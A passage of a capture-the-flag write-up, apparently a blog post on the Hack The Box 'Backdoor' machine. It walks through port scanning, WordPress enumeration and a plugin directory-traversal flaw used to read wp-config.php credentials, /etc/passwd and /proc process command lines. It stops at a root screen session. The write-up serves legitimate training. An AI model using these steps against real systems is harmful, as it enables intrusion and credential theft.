@@ -1,0 +1,1317 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB - Backdoor - bynafrez08.io</title>
+<meta name="description" content="Backdoor is a linux machine with easy level both in explatation phase and PrivEs, in my opinion for me the explatation it’s medium level of difficulty…">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="bynafrez08.io">
+<meta property="og:title" content="HTB - Backdoor">
+<meta property="og:url" content="http://localhost:4000/htb-backdoor/">
+
+
+  <meta property="og:description" content="Backdoor is a linux machine with easy level both in explatation phase and PrivEs, in my opinion for me the explatation it’s medium level of difficulty…">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/img-backdoor/portada.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-11-30T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-backdoor/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="bynafrez08.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+   <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Article</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Search</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB - Backdoor</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar1.png" alt="Nafsu Uddin | AKA bynafrez" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Nafsu Uddin | AKA bynafrez</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Networking / Pentesting / Offensive Security
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/bynafrez08" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB - Backdoor">
+    <meta itemprop="description" content="Backdoor is a linux machine with easy level both in explatation phase and PrivEs, in my opinion for me the explatation it’s medium level of difficulty…">
+    <meta itemprop="datePublished" content="November 30, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB - Backdoor
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-11-30T00:00:00-05:00">November 30, 2021 </time> 
+          
+          
+        </p>
+        <p>Backdoor is a linux machine with easy level both in explatation phase and PrivEs, in my opinion for me the explatation it’s medium level of difficulty, this machine is hosting a wordpress website with one plugin install it which is vulnerable to directory path traversal and the machine have a gdbserver running in background on the port 1337 which is vulnerable to RCE, and lastly on the PrivEsc is very simple because is running a screen session to the user root with SUID permission.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/portada.png">
+</p>
+
+<p>Machine matrix:</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/nivel.png">
+</p>
+
+<p>First we will create a directory with the name of the machine, and with <strong><em>mkt</em></strong> i will create the following directories to be able to move better the content of each one of those directories.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura1.png">
+</p>
+
+<p>mkt is a function that i have defined in the <strong><em>~/.zshrc</em></strong> so that I can create these directories without creating them one by one.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura2.png">
+</p>
+
+<h2 id="recognition">Recognition</h2>
+
+<p>We send one icmp trace to the victim machine, and we can see that we have sent a packet and received that packet back. and through the TTL we can know that the target machine is linux. since linux machines have ttl 64 and windows machines have ttl 128.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura3.png">
+</p>
+
+<p>If you asking why when we receive the packet the ttl shows 63 instead of 64? this is because when we send icmp packet to the machine it goes through a series of intermediary nodes and this causes the ttl to decrease by one digit, and this process is known a traceroute. We can see this if we use the <strong><em>-R</em></strong> parameter.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/trace.png">
+</p>
+
+<p>Anyway i have a tool on my system called <strong><em>wichsystem</em></strong> that tells if the machine is linux or windows through the ttl.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura4.png">
+</p>
+
+<p>Wichsystem script.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+#coding: utf-8
+</span> 
+<span class="kn">import</span> <span class="nn">re</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span>
+ 
+<span class="c1"># python3 wichSystem.py YOURIP 
+</span> 
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+ 
+<span class="k">def</span> <span class="nf">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
+ 
+    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
+ 
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+ 
+    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+ 
+    <span class="k">return</span> <span class="n">ttl_value</span>
+ 
+<span class="k">def</span> <span class="nf">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">):</span>
+ 
+    <span class="n">ttl</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
+ 
+    <span class="k">if</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">64</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Linux"</span>
+    <span class="k">elif</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">128</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Windows"</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Not Found"</span>
+ 
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+ 
+    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+ 
+    <span class="n">ttl</span> <span class="o">=</span> <span class="n">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>
+ 
+    <span class="n">os_name</span> <span class="o">=</span> <span class="n">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="si">%</span><span class="s">s (ttl -&gt; </span><span class="si">%</span><span class="s">s): </span><span class="si">%</span><span class="s">s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>
+
+</code></pre></div></div>
+
+<h2 id="scanning">Scanning</h2>
+
+<p>Now with nmap we are going to do the scanning process to know what’s ports and services are running on the target machine, with the following parameters.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Flags</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td>Means that we want to scan all the ports that exists in tcp and udp which is in total 65,535 ports.</td>
+    </tr>
+    <tr>
+      <td>-sS</td>
+      <td>Means that we want tcp syn scan.</td>
+    </tr>
+    <tr>
+      <td>–min-rate 5000</td>
+      <td>Means we just want to send packets no slower then 5000 packets per second to discover ports, and with that parameter our scan will be most faster.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td>Means that we want only output the ports with the status open not filtred.</td>
+    </tr>
+    <tr>
+      <td>-vvv</td>
+      <td>Means that we want to output more information.</td>
+    </tr>
+    <tr>
+      <td>-n</td>
+      <td>Means we don’t want DNS resolution, because sometimes the DNS resolution can take our scan much slower.</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td>Means that we don’t to ping to discover ports.</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td>Means that we want to save the scan in grapable format to not rescan again, you have more formats to save like nmap, xml, etc.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Basically i export the scan in grepable format because I have a function that i define in the ~/.zshrc which is the <strong><em>extractports</em></strong> function, basically it allows me to visualize the ports in a more elegant way and it copies the ports in the clipboard, so this is useful when we are scanning a target machine and it has to much ports and we don’t need to write one by one to scan those ports.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/extrac.png">
+</p>
+
+<h2 id="scanning---port-recognition">Scanning - Port Recognition</h2>
+
+<p>Once we discoverd the ports that are open on the target machine, it’s time for scanning those ports to know what version of services are running this ports, with the following parameters.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Flags</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-sCV</td>
+      <td>Means that we want to use some nmap scripts, in this case to discover the version and services that are running each of those ports.</td>
+    </tr>
+    <tr>
+      <td>-p</td>
+      <td>To specify the ports.</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td>Save the scan in nmap format.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The scanning results:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.91 scan initiated Tue Nov 30 03:14:40 2021 as: nmap -sCV -p22,80,1337 -oN targeted 10.10.11.125
+Nmap scan report for backdoor.htb (10.10.11.125)
+Host is up (0.058s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
+|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
+|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: WordPress 5.8.1
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Backdoor &amp;#8211; Real-Life
+1337/tcp open  waste?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Nov 30 03:17:36 2021 -- 1 IP address (1 host up) scanned in 175.66 seconds
+</code></pre></div></div>
+
+<p>Now we access the website to see some information that may be useful to us. In wappalyzer we can see that this is a wordpress website with the version 5.8.1, let’s check if this particular version of wordpress is vulnerable.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura9.png">
+</p>
+
+<p>With searchsploit i didm’t find any vuln with this particular version of wordpress.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura16.png">
+</p>
+
+<p>When I click on the home menu it does not let me access because it didn’t find the following domain. And this means that virtual hosting is being applied.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura8.png">
+</p>
+
+<p>To apply the virtual hosting we need to access on the file <strong><em>/etc/hosts</em></strong> and we need put the ip of the target machine and the domain. And if we ping that domain it will redirect with that ip address.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura9.png">
+</p>
+
+<p>Now if we access on the home page it will recognize the domain, but anything interesting on the home page.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura10.png">
+</p>
+
+<p>So if we go on the blog sectition there is a post that is posted by the admin user, so we know that there is an admin users inside on that wordpress site. One way to enumerate users in wordpress is by looking the user who post a certain article if in the case it is a blog or we can find it in some othere section in the site.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura11.png">
+</p>
+
+<p>So normally in wordpress the loggin page it should be located in <strong><em>wp-login.php</em></strong>, and if we try to access with the admin user with some default password we can see that we don’t have a access.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura12.png">
+</p>
+
+<p>So, what we can do now it’s try to fuzzing the website to see of there is a pontential route that we can take advantage, with nmap you can try fuzzing specifying the script <strong><em>http-enum</em></strong>, and it will output the following routes, normally in wordpress sites the paths will start with <strong><em>wp</em></strong> which stands for wordpress.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Thu Apr 28 11:09:30 2022 as: nmap --script http-enum -p 80 -oN webscan 10.10.11.125
+Nmap scan report for backdoor.htb (10.10.11.125)
+Host is up (0.049s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /wp-login.php: Possible admin folder
+|   /readme.html: Wordpress version: 2
+|   /: WordPress version: 5.8.1
+|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+|   /wp-login.php: Wordpress login page.
+|   /wp-admin/upgrade.php: Wordpress login page.
+|_  /readme.html: Interesting, a readme.
+
+# Nmap done at Thu Apr 28 11:09:40 2022 -- 1 IP address (1 host up) scanned in 9.56 seconds
+</code></pre></div></div>
+<p>So nmap can be noisy and sometimes the fuzzing with nmap can be a little bit trash, another alternative is using <strong><em>gobuster</em></strong> which is made in golang language and go works well with sockets and connections, so the fuzzing process can be much faster.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura18.png">
+</p>
+
+<p>So, in wordpress sites normally the plugins that are installed are stored on the <strong><em>wp-content</em></strong> path specifically on <strong><em>wp-content/plugins</em></strong>, what we can do is use a tool called <strong><em>wpscan</em></strong> which is a wordpress scanner to scan the users, plugins that can have the particular wordpress site and it can output if that plugin is vulnerable or not. So we are going to scan usig this tool with the following parameters:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Flags</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-u</td>
+      <td>Specify the url.</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td>Verbose mode.</td>
+    </tr>
+    <tr>
+      <td>–enumerate</td>
+      <td>Specify that we want to enumerate someting.</td>
+    </tr>
+    <tr>
+      <td>vp</td>
+      <td>Find Vulnerable plugins.</td>
+    </tr>
+    <tr>
+      <td>ap</td>
+      <td>Scan all plugins.</td>
+    </tr>
+    <tr>
+      <td>p</td>
+      <td>Popular plugins.</td>
+    </tr>
+    <tr>
+      <td>vt</td>
+      <td>Vulnerable themes.</td>
+    </tr>
+    <tr>
+      <td>cb</td>
+      <td>Find config backups files.</td>
+    </tr>
+    <tr>
+      <td>u</td>
+      <td>Emumerate users.</td>
+    </tr>
+    <tr>
+      <td>dbe</td>
+      <td>Export database.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura19.png">
+</p>
+
+<p>This is a wpscan look like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.20
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[32m[+][0m URL: http://10.10.11.125/ [10.10.11.125]
+[32m[+][0m Started: Sun Nov 28 03:51:52 2021
+
+Interesting Finding(s):
+
+[32m[+][0m Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[32m[+][0m XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[32m[+][0m WordPress readme found: http://10.10.11.125/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[32m[+][0m Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[32m[+][0m The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[32m[+][0m WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.11.125/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
+ |  - http://10.10.11.125/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
+
+[32m[+][0m WordPress theme in use: twentyseventeen
+ | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
+ | Latest Version: 2.8 (up to date)
+ | Last Updated: 2021-07-22T00:00:00.000Z
+ | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
+ | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus on business sites, it features multiple sections on the front page as well as widgets, navigation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our default theme for 2017 works great in many languages, for any abilities, and on any device.
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ | License: GNU General Public License v2 or later
+ | License URI: http://www.gnu.org/licenses/gpl-2.0.html
+ | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-language-support, sticky-post, theme-options, threaded-comments, translation-ready, block-patterns
+ | Text Domain: twentyseventeen
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.8 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'
+
+
+[34m[i][0m No plugins Found.
+
+[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
+[33m[!][0m You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[32m[+][0m Finished: Sun Nov 28 03:51:56 2021
+[32m[+][0m Requests Done: 2
+[32m[+][0m Cached Requests: 34
+[32m[+][0m Data Sent: 606 B
+[32m[+][0m Data Received: 1.027 KB
+[32m[+][0m Memory used: 239.539 MB
+[32m[+][0m Elapsed time: 00:00:04
+</code></pre></div></div>
+<p>So apparently it didn’t scan any shit. We can try to scan in more aggressive way using the command <strong><em>wpscan –url http: //backdoor.htb –plugins-detection aggressive</em></strong> but the scan would take a long time. I think maybe this tool it’s not useful anymore or it can be that we need some token.</p>
+
+<p>So what i did is access on the path <strong><em>wp-content/plugins</em></strong> and i found a plugin that is installed called <strong><em>ebook-download</em></strong> on the target wordpress site, so i was right maybe the wpscan it can be deprecated or it could be that i need some special token to perform the scan.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura20.png">
+</p>
+
+<p>So, if we access the directory of that plugin there is a <strong><em>readme.txt</em></strong> which is shows the information about that plugin including the version, so we know that this plugin is using the version <strong><em>1.1</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura21.png">
+</p>
+
+<p>If we quick search with searchsploit about that plugin, we can see that the version <strong><em>1.1</em></strong> its’s vulnerable to <strong><em>directory traversal</em></strong> which is the same version that is using the target machine. So we will download that file using the <strong><em>-m</em></strong> which is will copy and download, and with flag <strong><em>-x</em></strong> we can view that exploit without downloading.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura13.png">
+</p>
+
+<p>So if we look the content of that exploit we can see that this plugin is vulnerable to directory path traversal on the following route.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura23.png">
+</p>
+
+<p>If we try to access on that particular route it will download a file called <strong><em>wp-config.php</em></strong>, which is the wordpress config file of the target site and in this file normally are stored the username and password of the database and more information about the server, as we can see on the following:</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura24.png">
+</p>
+
+<p>So, we can’t take advantage about this credentials for now because we need to access to the machine to access to the database, so we can use this credentials when we access on the machine.</p>
+
+<p>If we go back to the root directory using <strong><em>../</em></strong>, and we specify the file <strong><em>/etc/passwd</em></strong> we can see that we are able to list users on the target system, and we can see that there is a user called <strong><em>user</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura14.png">
+</p>
+
+<p>Before on the scanning process we saw that there is a port 22 open, if we try to view the private ssh key for this particular we can’t.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura15.png">
+</p>
+
+<p>But we are able to see the content of the <strong><em>proc</em></strong> files which is the directory where stores the processes on the system, as we can see here i am able to view the content of the file <strong><em>version</em></strong> which tell us the version of the kernel and OS on the target system.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura16.png">
+</p>
+
+<p>Normally on each of those process directories it contain a file called <strong><em>cmdline</em></strong> which is the file where stores the command that is running on the background, So What we can do is try to see the content of this file in every process on the system using <strong><em>brute force attack</em></strong>, to see if we find anything interesting or we can see what service is running on the port 1337 as we saw on the scanning process that it don’t tell us what service is running, because this port it can use for general purposes.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura18.png">
+</p>
+
+<p>On the path <strong><em>/proc/self/cmdline</em></strong> we can view the actual process command that are running in the background, in this case we can that the apache services is running, but anything else.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura19.png">
+</p>
+
+<p>So we have a several options to do this process, in this i am going to show three ways to do it. Starting with the first which will going to be with <strong><em>burpsuite</em></strong> i don’t recommend brute do it with burpsuite because it can take a long time.</p>
+
+<p>So first, open burpsuite and intercept the request.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura53.png">
+</p>
+
+<p>Then we are going to send this request to <strong><em>intruder</em></strong> with <strong><em>ctrl+i</em></strong> and where are going to add the path <strong><em>/proc/pid/cmdline</em></strong>, and where is says <strong><em>pid</em></strong> where going to add the payload marker which is those two “s”, we can do that selecting the word pid and click on the button <strong><em>add</em></strong>. Remember that the pid is the process ID of each proceses on the system.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura54.png">
+</p>
+
+<p>So we are going to move on the payloads section and here on the <strong><em>payload type</em></strong> we are going to select <strong><em>numbers</em></strong>. So what we are going to do here is add a sequential which it gonna be the range of PIDs that we want to brute force or check. So in my case i want to brute force from 800 to 1000 PID, and this sequence number can be variant because let’s say that you will need to check between 700 to 1000 or 1 to 1000 to find what command is running on background, depending the range you specify it can take a long time and also if we are using burpsuite.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura56.png">
+</p>
+
+<p>So click on <strong><em>start attack</em></strong> and this it going to send a requests with each PIDs range that we specify. So on the response we can see that on the PID 800 that there is a system process running on the backgroung.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura57.png">
+</p>
+
+<p>If i continue to scrolling down we can see on the PID 855 there is process that is running a screen command with the user <strong><em>root</em></strong> session, so here we can think that if the screen command is SUID we can access on that particular session, and we are able to be root. This is similar when we save a session with tmux.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor2/captura58.png">
+</p>
+
